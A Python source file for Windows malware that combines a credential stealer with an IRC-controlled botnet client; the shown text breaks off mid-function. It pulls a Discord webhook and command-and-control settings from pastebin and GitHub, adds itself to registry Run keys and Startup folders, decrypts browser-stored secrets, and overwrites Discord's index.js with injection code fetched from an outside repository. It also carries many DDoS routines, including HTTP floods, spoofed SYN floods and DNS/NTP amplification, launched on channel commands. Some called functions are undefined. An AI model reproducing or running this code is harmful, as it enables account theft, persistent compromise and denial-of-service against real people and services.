import aiofiles
import aiohttp
import asyncio
import base64
import colorama
import concurrent.futures
import ctypes
import gzip
import json
import os
import subprocess
import platform
import psutil
import sys
import requests
import sqlite3
import win32crypt
import re
from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from os import getlogin, listdir
from json import loads, dumps
from re import findall
from urllib.request import Request, urlopen
from subprocess import Popen, PIPE
from datetime import datetime
from threading import Thread
from time import sleep
from sys import argv
from requests.exceptions import RequestException
import random
import socket
import cv2
import zipfile
import shutil
import browser_cookie3
from typing import Union
import pyautogui
import scapy.all as scapy
import ssl
import winreg
from aiohttp import FormData
from colorama import Fore
from ctypes import wintypes
from OpenSSL import SSL
from PIL import ImageGrab
import geocoder
import getpass
import pyaes
from urllib3 import PoolManager
from urllib3.response import HTTPResponse
import traceback
import logging
import zlib
from urllib3 import disable_warnings as disable_warnings_urllib3
from pystyle import Colors, Colorate, Write, Center, Box, Add, Anime
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

def fetch_url(url):
    try:
        response = requests.get(url)
        if response.status_code == 200:
            return response.text.strip()
        else:
            return None
    except requests.RequestException:
        return None

def get_irc_channel():
    primary_url = "https://pastebin.com/raw/txAETwmT"
    fallback_url = "https://raw.githubusercontent.com/247msn/96737693845/refs/heads/main/ircinfo"
    data = fetch_url(primary_url)
    if not data:
        data = fetch_url(fallback_url)
    if data:
        lines = data.split("\n")
        for line in lines:
            if line.startswith("Channel"):
                return line.split(":")[1].strip()
    return None

def get_irc_password():
    primary_url = "https://pastebin.com/raw/txAETwmT"
    fallback_url = "https://raw.githubusercontent.com/247msn/96737693845/refs/heads/main/ircinfo"
    data = fetch_url(primary_url)
    if not data:
        data = fetch_url(fallback_url)
    if data:
        lines = data.split("\n")
        for line in lines:
            if line.startswith("Password"):
                return line.split(":")[1].strip()
    return None

def get_irc_server():
    primary_url = "https://pastebin.com/raw/txAETwmT"
    fallback_url = "https://raw.githubusercontent.com/247msn/96737693845/refs/heads/main/ircinfo"
    data = fetch_url(primary_url)
    if not data:
        data = fetch_url(fallback_url)
    if data:
        lines = data.split("\n")
        for line in lines:
            if line.startswith("Server"):
                return line.split(":")[1].strip()
    return None

def get_webhook():
    response = requests.get("https://pastebin.com/raw/1TgFXXB5")
    return response.text.strip()

webhook = f'{get_webhook()}'
discord_injection = True

def get_user():
    return os.getenv('USERNAME')

def regedit_startup():
    exe_path = os.path.abspath(sys.argv[0])
    
    user_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE)
    winreg.SetValueEx(user_key, "$77NetworkIntegrityService", 0, winreg.REG_SZ, exe_path)
    winreg.CloseKey(user_key)
    
    try:
        system_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(system_key, "$77NetworkIntegrityService", 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(system_key)
    except PermissionError:
        print("Admin privileges are required to add to the system-wide startup.")

def normal_startup():
    exe_path = os.path.abspath(sys.argv[0])
    
    user_startup_folder = os.path.join(os.environ['APPDATA'], r"Microsoft\Windows\Start Menu\Programs\Startup")
    user_startup_exe_path = os.path.join(user_startup_folder, os.path.basename(exe_path))
    if not os.path.exists(user_startup_exe_path):
        shutil.copyfile(exe_path, user_startup_exe_path)
    
    try:
        system_startup_folder = os.path.join(os.environ['PROGRAMDATA'], r"Microsoft\Windows\Start Menu\Programs\Startup")
        system_startup_exe_path = os.path.join(system_startup_folder, os.path.basename(exe_path))
        if not os.path.exists(system_startup_exe_path):
            shutil.copyfile(exe_path, system_startup_exe_path)
    except PermissionError:
        print("Admin privileges are required to add to the system-wide startup.")

def startups():
    regedit_startup()
    normal_startup()

class Variables:
    Passwords = list()
    Cards = list()
    Cookies = list()
    Historys = list()
    Downloads = list()
    Autofills = list()
    Bookmarks = list()
    Wifis = list()
    SystemInfo = list()
    ClipBoard = list()
    Processes = list()
    Network = list()
    FullTokens = list()
    ValidatedTokens = list()
    DiscordAccounts = list()
    SteamAccounts = list()
    InstagramAccounts = list()
    TwitterAccounts = list()
    TikTokAccounts = list()
    RedditAccounts = list()
    TwtichAccounts = list()
    SpotifyAccounts = list()
    RobloxAccounts = list()
    RiotGameAccounts = list()

class SubModules:
    @staticmethod
    def CryptUnprotectData(encrypted_data: bytes, optional_entropy: str= None) -> bytes: 

        class DATA_BLOB(ctypes.Structure):

            _fields_ = [
                ("cbData", ctypes.c_ulong),
                ("pbData", ctypes.POINTER(ctypes.c_ubyte))
            ]
        
        pDataIn = DATA_BLOB(len(encrypted_data), ctypes.cast(encrypted_data, ctypes.POINTER(ctypes.c_ubyte)))
        pDataOut = DATA_BLOB()
        pOptionalEntropy = None

        if optional_entropy is not None:
            optional_entropy = optional_entropy.encode("utf-16")
            pOptionalEntropy = DATA_BLOB(len(optional_entropy), ctypes.cast(optional_entropy, ctypes.POINTER(ctypes.c_ubyte)))

        if ctypes.windll.Crypt32.CryptUnprotectData(ctypes.byref(pDataIn), None, ctypes.byref(pOptionalEntropy) if pOptionalEntropy is not None else None, None, None, 0, ctypes.byref(pDataOut)):
            data = (ctypes.c_ubyte * pDataOut.cbData)()
            ctypes.memmove(data, pDataOut.pbData, pDataOut.cbData)
            ctypes.windll.Kernel32.LocalFree(pDataOut.pbData)
            return bytes(data)

        raise ValueError("Invalid encrypted_data provided!")

    @staticmethod
    def GetKey(FilePath:str) -> bytes:
        with open(FilePath,"r", encoding= "utf-8", errors= "ignore") as file:
            jsonContent: dict = json.load(file)

            encryptedKey: str = jsonContent["os_crypt"]["encrypted_key"]
            encryptedKey = base64.b64decode(encryptedKey.encode())[5:]

            return SubModules.CryptUnprotectData(encryptedKey)

    @staticmethod
    def Decrpytion(EncrypedValue: bytes, EncryptedKey: bytes) -> str:
        try:
            version = EncrypedValue.decode(errors="ignore")
            if version.startswith("v10") or version.startswith("v11"):
                iv = EncrypedValue[3:15]
                password = EncrypedValue[15:]
                authentication_tag = password[-16:]
                password = password[:-16]
                backend = default_backend()
                cipher = Cipher(algorithms.AES(EncryptedKey), modes.GCM(iv, authentication_tag), backend=backend)
                decryptor = cipher.decryptor()
                decrypted_password = decryptor.update(password) + decryptor.finalize()
                return decrypted_password.decode('utf-8')
            else:
                return str(SubModules.CryptUnprotectData(EncrypedValue))
        except:
            return "Decryption Error!, Data cant be decrypt"
        
    @staticmethod
    def create_mutex(mutex_value) -> bool:
        kernel32 = ctypes.windll.kernel32
        mutex = kernel32.CreateMutexA(None, False, mutex_value)
        return kernel32.GetLastError() != 183
    
    @staticmethod
    def IsAdmin() -> bool:
        try:
            return bool(ctypes.windll.shell32.IsUserAnAdmin())
        except:
            return False

class DiscordInjection:
    def __init__(self) -> None:
        self.tokens = Variables.ValidatedTokens
        self.already_killed = False
        self.LocalAppData = os.getenv("localappdata")

    async def InjectIntoToDiscord(self, webhook) -> None:
        try:
            if discord_injection:
                print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}]{Fore.GREEN} Starting discord injection")
                discord_dirs = {
                    "Discord" : os.path.join(self.LocalAppData, "discord"),
                    "Discord Canary" : os.path.join(self.LocalAppData, "discordcanary"),
                    "Lightcord" : os.path.join(self.LocalAppData, "Lightcord"),
                    "Discord PTB" : os.path.join(self.LocalAppData, "discordptb"),
                }
                injection_code = await self.GetInjectionCode(webhook)
                for f, file_paths in discord_dirs.items():
                    if os.path.exists(file_paths):
                        indexPath = await self.FindIndexPath(file_paths)
                        
                        # Check if the indexPath is valid (not None)
                        if indexPath is None:
                            print(f"{Fore.WHITE}[{Fore.RED}-{Fore.WHITE}]{Fore.RED} Error: indexPath is None for {f}")
                            continue  # Skip this iteration and move to the next

                        with open(indexPath, "r", encoding="utf-8", errors="ignore") as file:
                            if webhook not in file.read():
                                if not self.already_killed:
                                    await self.KillDiscord()
                                with open(indexPath, "w", encoding="utf-8", errors="ignore") as x:
                                    x.write(injection_code.replace("%WEBHOOK%", webhook))
                                command = os.path.join(file_paths, "Update.exe") + " --processStart Discord.exe"
                                result = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, shell=True)
                                await result.communicate()
                print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}]{Fore.GREEN} Discord Injection was executed successfully")  
        except Exception as error:
            print(f"{Fore.WHITE}[{Fore.RED}-{Fore.WHITE}]{Fore.RED} An error occurred while injecting into discord, error code => \"{error}\"")

    async def GetInjectionCode(self, webhook) -> str:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get("https://raw.githubusercontent.com/antivirusevasion23/injection/main/injection.js") as response:
                    data = await response.text()
                    return data.replace("%WEBHOOK%", webhook)
        except Exception as error:
            print(f"{Fore.WHITE}[{Fore.RED}-{Fore.WHITE}]{Fore.RED} An error occurred while getting injection code, error code => \"{error}\"")
            return None

    async def KillDiscord(self) -> None:
        try:
            proc = await asyncio.create_subprocess_shell("tasklist | findstr /i discord", stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, shell=True)
            stdout, stderr = await proc.communicate()
            processes = stdout.decode(errors="ignore").split('\n')
            for proc in processes:
                if 'discord' in proc.lower():
                    try:
                        pid = int(proc.split()[1])
                        kill_proc = await asyncio.create_subprocess_shell(f"taskkill /F /PID {pid}", shell=True,stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
                        await kill_proc.communicate()
                        self.already_killed = True
                    except:
                        pass
        except:
            pass

    async def FindIndexPath(self, path: str) -> str:
        try:
            for file in os.listdir(path):
                if re.search(r'app-+?', file):
                    modules_dir = os.path.join(path, file, "modules")
                    
                    if not os.path.exists(modules_dir):
                        print(f"{Fore.WHITE}[{Fore.RED}-{Fore.WHITE}]{Fore.RED} Error: {modules_dir} not found. Skipping this directory.")
                        continue
                    
                    for modules_files in os.listdir(modules_dir):
                        if re.search(r'discord_desktop_core-+?', modules_files):
                            core_path = os.path.join(modules_dir, modules_files, "discord_desktop_core")
                            index_path = os.path.join(core_path, "index.js")
                            
                            if os.path.isfile(index_path):
                                return index_path
                            else:
                                print(f"{Fore.WHITE}[{Fore.RED}-{Fore.WHITE}]{Fore.RED} index.js not found in {core_path}")
            return None
        except Exception as error:
            print(f"{Fore.WHITE}[{Fore.RED}-{Fore.WHITE}]{Fore.RED} Error finding index path: {error}")
            return None

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1",
]

def fetch_url_with_random_user_agent(raw_url, fallback_url):
    user_agent = random.choice(user_agents)
    
    headers = {
        'User-Agent': user_agent,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
    }

    def fetch_url(url):
        req = urllib.request.Request(url, headers=headers)
        try:
            response = urllib.request.urlopen(req)
            if 'gzip' in response.headers.get('Content-Encoding', ''):
                buf = BytesIO(response.read())
                f = gzip.GzipFile(fileobj=buf)
                return f.read().decode('utf-8')
            else:
                return response.read().decode('utf-8')
        except urllib.error.HTTPError as e:
            print(f"HTTP Error: {e.code} - {e.reason}")
            return None
        except Exception as e:
            print(f"Error: {str(e)}")
            return None

    raw_code = fetch_url(raw_url)
    
    if not raw_code:
        print(f"Attempting to fetch from fallback URL...")
        raw_code = fetch_url(fallback_url)
    
    return raw_code

def random_nickname():
    characters = 'abcdefghijklmnopqrstuvwxyz0123456789'
    nickname = f"" + ''.join(random.choices(characters, k=10))
    return nickname

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1",
]

def connect_to_irc(server, port, channel, channel_password):
    nickname = random_nickname()
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    context = SSL.Context(SSL.TLSv1_2_METHOD)
    irc = SSL.Connection(context, sock)

    try:
        irc.connect((server, port))
        print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}]{Fore.GREEN} Connected to HexChat")
        irc.send(f"NICK {nickname}\n".encode("utf-8"))
        time.sleep(1)
        irc.send(f"USER {nickname} 0 * :Bot\n".encode("utf-8"))
        time.sleep(1)
    except Exception as e:
        print(f"Error connecting or registering with IRC server: {e}")
        return None

    try:
        while True:
            response = irc.recv(2048).decode("utf-8")

            if response.startswith("PING"):
                irc.send(f"PONG {response.split()[1]}\n".encode("utf-8"))
            
            elif "Erroneous Nickname" in response:
                print("Retrying with a new nickname.")
                nickname = random_nickname()
                irc.send(f"NICK {nickname}\n".encode("utf-8"))
                irc.send(f"USER {nickname} 0 * :Bot\n".encode("utf-8"))
                time.sleep(1)

            elif "Welcome" in response:
                join_channel(irc, channel, channel_password)
                return irc

    except Exception as e:
        print(f"Error during IRC communication: {e}")
        return None

def join_channel(irc, channel, channel_password):
    try:
        if channel_password:
            irc.send(f"JOIN {channel} {channel_password}\n".encode("utf-8"))
        else:
            irc.send(f"JOIN {channel}\n".encode("utf-8"))
        print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}]{Fore.GREEN} Connected to Botnet IRC")
    except Exception as e:
        print(f"Error joining channel: {e}")

# Botnet Commands

def start_mining():
    signal(SIGINT , handler)
    StartMining()

# layer 7

def http_browser_flood(target_url, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
            }
            requests.get(target_url, headers=headers)
            print(f"HTTP Browser flood request sent to {target_url}")
        except requests.exceptions.RequestException as e:
            print(f"HTTP Browser flood error: {e}")

def http_flood(target_url, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            requests.get(target_url)
            print(f"HTTP flood request sent to {target_url}")
        except requests.exceptions.RequestException as e:
            print(f"HTTP flood error: {e}")

def http_flood_monkey(target_url, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            requests.get(target_url)
            print(f"Monkey flood request sent to {target_url}")
        except requests.exceptions.RequestException as e:
            print(f"Monkey flood error: {e}")

def http_mix_flood(target_url, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
            }
            requests.get(target_url, headers=headers)
            print(f"HTTP Mix flood request sent to {target_url}")
        except requests.exceptions.RequestException as e:
            print(f"HTTP Mix flood error: {e}")

def http_cookie_flood(target_url, duration):
    end_time = time.time() + duration
    cookies = {'session_id': 'fake_session_id'}
    while time.time() < end_time:
        try:
            requests.get(target_url, cookies=cookies)
            print(f"HTTP Cookie flood request sent to {target_url}")
        except requests.exceptions.RequestException as e:
            print(f"HTTP Cookie flood error: {e}")

def ack_flood(target_ip, target_port, duration):
    end_time = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    
    while time.time() < end_time:
        try:
            packet = b'\x00' * 40
            sock.sendto(packet, (target_ip, target_port))
            print(f"ACK flood packet sent to {target_ip}:{target_port}")
        except Exception as e:
            print(f"ACK flood error: {e}")

    sock.close()

def udp_pps_attack(target_ip, target_port, duration):
    end_time = time.time() + duration
    data = random._urandom(1024)
    packet_count = 0
    stop_event = threading.Event()

    def attack():
        nonlocal packet_count
        while not stop_event.is_set():
            if time.time() >= end_time:
                stop_event.set()
                break
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(data, (target_ip, target_port))
                packet_count += 1
                if packet_count % 1000 == 0:
                    print(f"Sent {packet_count} UDP packets to {target_ip}:{target_port}")
            except Exception as e:
                print(f"Error in UDP-PPS attack: {e}")
            finally:
                sock.close()

    threads = []
    for _ in range(200):
        thread = threading.Thread(target=attack)
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    print(f"UDP-PPS attack on {target_ip}:{target_port} completed for {duration} seconds.")

def udp_gbps_attack(target_ip, target_port, duration):
    end_time = time.time() + duration
    data = random._urandom(65507)
    stop_event = threading.Event()

    def attack():
        while not stop_event.is_set():
            if time.time() >= end_time:
                stop_event.set()
                break
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(data, (target_ip, target_port))
                print(f"UDP-GBPS packet sent to {target_ip}:{target_port}")
            except Exception as e:
                print(f"Error in UDP-GBPS attack: {e}")
            finally:
                sock.close()

    threads = []
    for _ in range(200):
        thread = threading.Thread(target=attack)
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    print(f"UDP-GBPS attack on {target_ip}:{target_port} completed for {duration} seconds.")

def dns_amp_attack(target_ip, target_port, duration):
    end_time = time.time() + duration
    dns_query = random._urandom(512)
    stop_event = threading.Event()

    def attack():
        while not stop_event.is_set():
            if time.time() >= end_time:
                stop_event.set()
                break
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(dns_query, (target_ip, target_port))
                print(f"Sent DNS amplification request to {target_ip}:{target_port}")
            except Exception as e:
                print(f"Error in DNS AMP attack: {e}")
            finally:
                sock.close()

    threads = []
    for _ in range(800):
        thread = threading.Thread(target=attack)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    print(f"DNS AMP attack on {target_ip}:{target_port} completed for {duration} seconds.")

def ntp_amp_attack(target_ip, target_port, duration):
    end_time = time.time() + duration
    ntp_request = b'\x17\x00\x03\x2A'
    stop_event = threading.Event()

    def attack():
        while not stop_event.is_set():
            if time.time() >= end_time:
                stop_event.set()
                break
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(ntp_request, (target_ip, target_port))
                print(f"Sent NTP amplification request to {target_ip}:{target_port}")
            except Exception as e:
                print(f"Error in NTP AMP attack: {e}")
            finally:
                sock.close()

    threads = []
    for _ in range(800):
        thread = threading.Thread(target=attack)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    print(f"NTP AMP attack on {target_ip}:{target_port} completed for {duration} seconds.")

def tls_attack(target_ip, target_port, duration):
    end_time = time.time() + duration
    stop_event = threading.Event()

    def attack():
        while not stop_event.is_set():
            if time.time() >= end_time:
                stop_event.set()
                break
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                wrapped_socket = ssl.wrap_socket(sock)
                wrapped_socket.connect((target_ip, target_port))
                wrapped_socket.send(b"GET / HTTP/1.1\r\nHost: " + bytes(target_ip, 'utf-8') + b"\r\n\r\n")
                print(f"TLS connection made to {target_ip}:{target_port}")
            except Exception as e:
                print(f"Error in TLS attack: {e}")
            finally:
                wrapped_socket.close()

    threads = []
    for _ in range(800):
        thread = threading.Thread(target=attack)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    print(f"TLS attack on {target_ip}:{target_port} completed for {duration} seconds.")

def udp_raw_attack(target_ip, target_port, duration):
    end_time = time.time() + duration
    stop_event = threading.Event()
    packet_data = random._urandom(1024)

    def attack():
        while not stop_event.is_set():
            if time.time() >= end_time:
                stop_event.set()
                break
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(packet_data, (target_ip, target_port))
                print(f"UDP Raw packet sent to {target_ip}:{target_port}")
            except Exception as e:
                print(f"Error in UDP Raw attack: {e}")
            finally:
                sock.close()

    threads = []
    for _ in range(5000):
        thread = threading.Thread(target=attack)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    print(f"UDP Raw attack on {target_ip}:{target_port} completed for {duration} seconds.")

def udp_amp_attack(target_ip, target_port, duration):
    end_time = time.time() + duration
    stop_event = threading.Event()
    packet_data = random._urandom(1024)

    def attack():
        while not stop_event.is_set():
            if time.time() >= end_time:
                stop_event.set()
                break
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(packet_data, (target_ip, target_port))
                print(f"Sent amplification packet to {target_ip}:{target_port}")
            except Exception as e:
                print(f"Error in UDP AMP attack: {e}")
            finally:
                sock.close()

    threads = []
    for _ in range(5000):
        thread = threading.Thread(target=attack)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    print(f"UDP AMP attack on {target_ip}:{target_port} completed for {duration} seconds.")

def discord_attack(target_ip, target_port, duration):
    end_time = time.time() + duration
    stop_event = threading.Event()
    data = random._urandom(512)

    def attack():
        while not stop_event.is_set():
            if time.time() >= end_time:
                stop_event.set()
                break
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(data, (target_ip, target_port))
                print(f"Discord call packet sent to {target_ip}:{target_port}")
            except Exception as e:
                print(f"Error in Discord attack: {e}")
            finally:
                sock.close()

    threads = []
    for _ in range(200):
        thread = threading.Thread(target=attack)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    print(f"Discord attack on {target_ip}:{target_port} completed for {duration} seconds.")

def tcp_amp_attack(target_ip, target_port, duration):
    end_time = time.time() + duration
    stop_event = threading.Event()

    def attack():
        while not stop_event.is_set():
            if time.time() >= end_time:
                stop_event.set()
                break
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((target_ip, target_port))
                sock.sendall(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")
                sock.recv(4096)
                print(f"TCP Amplification packet sent to {target_ip}:{target_port}")
            except Exception as e:
                print(f"Error in TCP Amplification attack: {e}")
            finally:
                sock.close()

    threads = []
    for _ in range(1000):
        thread = threading.Thread(target=attack)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    print(f"TCP Amplification attack on {target_ip}:{target_port} completed for {duration} seconds.")

def combined_flood(target_ip, target_port, duration):
    end_time = time.time() + duration
    stop_event = threading.Event()

    def tcp_flood():
        while not stop_event.is_set():
            if time.time() >= end_time:
                stop_event.set()
                break
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((target_ip, target_port))
                sock.send(b"GET / HTTP/1.1\r\n")
                sock.close()
                print(f"TCP packet sent to {target_ip}:{target_port}")
            except socket.error as e:
                print(f"TCP flood error: {e}")

    def udp_flood():
        while not stop_event.is_set():
            if time.time() >= end_time:
                stop_event.set()
                break
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(b"A" * 1024, (target_ip, target_port))
                print(f"UDP packet sent to {target_ip}:{target_port}")
            except socket.error as e:
                print(f"UDP flood error: {e}")

    tcp_threads = [threading.Thread(target=tcp_flood) for _ in range(200)]
    udp_threads = [threading.Thread(target=udp_flood) for _ in range(200)]

    for thread in tcp_threads + udp_threads:
        thread.start()
    for thread in tcp_threads + udp_threads:
        thread.join()

    print(f"Combined flood attack on {target_ip}:{target_port} completed for {duration} seconds.")

def tcp_bypass_attack(target_ip, target_port, duration):
    end_time = time.time() + duration
    stop_event = threading.Event()

    def attack():
        while not stop_event.is_set():
            if time.time() >= end_time:
                stop_event.set()
                break
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                sock.connect((target_ip, target_port))
                sock.sendall(b"\x00" * 1024)
                print(f"TCP connection bypass attempt to {target_ip}:{target_port}")
            except Exception as e:
                print(f"Error in TCP Bypass attack: {e}")
            finally:
                sock.close()

    threads = []
    for _ in range(400):
        thread = threading.Thread(target=attack)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    print(f"TCP bypass attack on {target_ip}:{target_port} completed for {duration} seconds.")

def tcp_pure_attack(target_ip, target_port, duration):
    end_time = time.time() + duration
    stop_event = threading.Event()

    def attack():
        while not stop_event.is_set():
            if time.time() >= end_time:
                stop_event.set()
                break
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((target_ip, target_port))
                sock.sendall(b"\xFF" * 4096)
                print(f"TCP Pure packet sent to {target_ip}:{target_port}")
            except Exception as e:
                print(f"Error in TCP Pure attack: {e}")
            finally:
                sock.close()

    threads = []
    for _ in range(500):
        thread = threading.Thread(target=attack)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    print(f"TCP pure attack on {target_ip}:{target_port} completed for {duration} seconds.")

def syn_flood(target_ip, target_port, duration):
    end_time = time.time() + duration
    stop_event = threading.Event()

    def attack():
        while not stop_event.is_set():
            if time.time() >= end_time:
                stop_event.set()
                break
            source_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
            source_port = random.randint(1024, 65535)
            
            ip_packet = scapy.IP(src=source_ip, dst=target_ip)
            tcp_packet = scapy.TCP(sport=source_port, dport=target_port, flags="S")
            packet = ip_packet / tcp_packet

            scapy.send(packet, verbose=0)
            print(f"SYN flood packet sent to {target_ip}:{target_port}")

    threads = []
    for _ in range(1000):
        thread = threading.Thread(target=attack)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    print(f"SYN flood attack on {target_ip}:{target_port} completed for {duration} seconds.")

def handle_messages(irc, channel):
    while True:
        response = irc.recv(2048).decode("utf-8")
        if response.startswith("PING"):
            irc.send(f"PONG {response.split()[1]}\n".encode("utf-8"))
        
        message = ""

        if f"PRIVMSG {channel}" in response:
            user = response.split('!')[0][1:]
            message = response.split(f"PRIVMSG {channel} :")[1].strip()
            print(f"{user}: {message}")
            
            if message.startswith(".https"):
                parts = message.split()
                if len(parts) == 4:
                    _, target_url, port, duration = parts
                    try:
                        duration = int(duration)
                        threads = [threading.Thread(target=https_flood, args=(target_url, duration)) for _ in range(200)]
                        for thread in threads:
                            thread.start()
                        for thread in threads:
                            thread.join()
                    except ValueError:
                        print("ERROR")
                else:
                    print("ERROR")
            
            elif message.startswith(".httpbrowser"):
                parts = message.split()
                if len(parts) == 4:
                    _, target_url, port, duration = parts
                    try:
                        duration = int(duration)
                        threads = [threading.Thread(target=http_browser_flood, args=(target_url, duration)) for _ in range(100000)]
                        for thread in threads:
                            thread.start()
                        for thread in threads:
                            thread.join()
                    except ValueError:
                        print("ERROR")
                else:
                    print("ERROR")

            elif message.startswith(".httpflood"):
                parts = message.split()
                if len(parts) == 4:
                    _, target_url, port, duration = parts
                    try:
                        duration = int(duration)
                        threads = [threading.Thread(target=http_flood, args=(target_url, duration)) for _ in range(1000)]
                        for thread in threads:
                            thread.start()
                        for thread in threads:
                            thread.join()
                    except ValueError:
                        print("ERROR")
                else:
                    print("ERROR")

            elif message.startswith(".httpmix"):
                parts = message.split()
                if len(parts) == 4:
                    _, target_url, port, duration = parts
                    try:
                        duration = int(duration)
                        threads = [threading.Thread(target=http_mix_flood, args=(target_url, duration)) for _ in range(200)]
                        for thread in threads:
                            thread.start()
                        for thread in threads:
                            thread.join()
                    except ValueError:
                        print("ERROR")
                else:
                    print("ERROR")

            elif message.startswith(".httpcookie"):
                parts = message.split()
                if len(parts) == 4:
                    _, target_url, port, duration = parts
                    try:
                        duration = int(duration)
                        threads = [threading.Thread(target=http_cookie_flood, args=(target_url, duration)) for _ in range(200)]
                        for thread in threads:
                            thread.start()
                        for thread in threads:
                            thread.join()
                    except ValueError:
                        print("ERROR")
                else:
                    print("ERROR")

            elif message.startswith(".ack"):
                parts = message.split()
                if len(parts) == 4:
                    _, target_ip, target_port, duration = parts
                    try:
                        target_port = int(target_port)
                        duration = int(duration)
                        threads = [threading.Thread(target=ack_flood, args=(target_ip, target_port, duration)) for _ in range(200)]
                        for thread in threads:
                            thread.start()
                        for thread in threads:
                            thread.join()
                    except ValueError:
                        print("ERROR")
                else:
                    print("ERROR")

            elif message.startswith(".dns-amp"):
                parts = message.split()
                if len(parts) == 4:
                    _, target_ip, target_port, duration = parts
                    try:
                        target_port = int(target_port)
                        duration = int(duration)
                        threads = [threading.Thread(target=dns_amp_attack, args=(target_ip, target_port, duration)) for _ in range(200)]
                        for thread in threads:
                            thread.start()
